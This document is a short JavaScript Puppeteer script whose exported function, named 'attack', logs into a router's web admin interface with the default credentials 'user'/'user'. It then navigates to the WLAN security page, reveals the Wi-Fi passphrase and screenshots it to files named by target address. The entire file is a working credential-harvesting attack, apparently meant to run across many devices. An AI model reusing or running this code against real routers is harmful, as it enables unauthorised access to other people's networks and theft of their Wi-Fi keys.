const defaultUsername = "user";
const defaultPassword = "user";

export default async function attack(page, endereco) {

    await page.focus("#Frm_Username");
    await page.keyboard.type(defaultUsername);
    await page.focus("#Frm_Password");
    await page.keyboard.type(defaultPassword);
    await page.click("#LoginId");

    const frame = await page.waitForFrame(frame => {
        return frame.url().includes("template") || frame.url().includes("getpage")
    }, {
        timeout: 5000
    });

    await (await frame.waitForSelector("#mmNet", {
        timeout: 2000
    })).click();

    await (await frame.waitForSelector("#smWLANONE", {
        timeout: 2000
    })).click();

    await (await frame.waitForSelector("#ssmWLANMul1", {
        timeout: 2000
    })).click();

    await page.screenshot({
        path: `./fotos/${endereco}-1.png`,
        fullPage: true
    });

    await (await frame.waitForSelector("#ssmWLANSec1", {
        timeout: 2000
    })).click();

    await (await frame.waitForSelector("#Frm_ShowKeyPassphrase", {
        timeout: 2000
    })).click();

    await page.screenshot({
        path: `./fotos/${endereco}-2.png`,
        fullPage: true
    });

}